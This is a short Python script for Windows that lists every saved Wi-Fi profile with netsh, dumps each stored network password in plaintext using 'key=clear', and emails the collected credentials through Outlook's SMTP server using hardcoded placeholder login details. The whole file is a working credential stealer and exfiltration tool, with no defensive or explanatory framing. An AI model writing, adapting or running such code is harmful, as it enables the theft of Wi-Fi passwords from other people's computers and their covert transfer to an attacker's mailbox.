#!/usr/bin/env python

import subprocess
import smtplib
import re


def send_mail(email, password, message):
    message = """\
        From: %s
        To: %s
        %s
        """ % (email, ", ".join(email), message)
    server = smtplib.SMTP("smtp-mail.outlook.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()


def get_ssid_list():
    command = "netsh wlan show profile"
    networks = subprocess.check_output(command, shell=True)
    return re.findall(b"(?:Profile\s*:\s)(.*)", networks)


def get_ssid_details(ssid):
    command = "netsh wlan show profile " + str(ssid.decode()) + " key=clear"
    return subprocess.check_output(command, text=True, shell=True)


result = ""
ssid_list = get_ssid_list()
for ssid_name in ssid_list:
    ssid_detail = get_ssid_details(ssid_name)
    result = result + ssid_detail

send_mail("my@mail.com", "mypassword", result)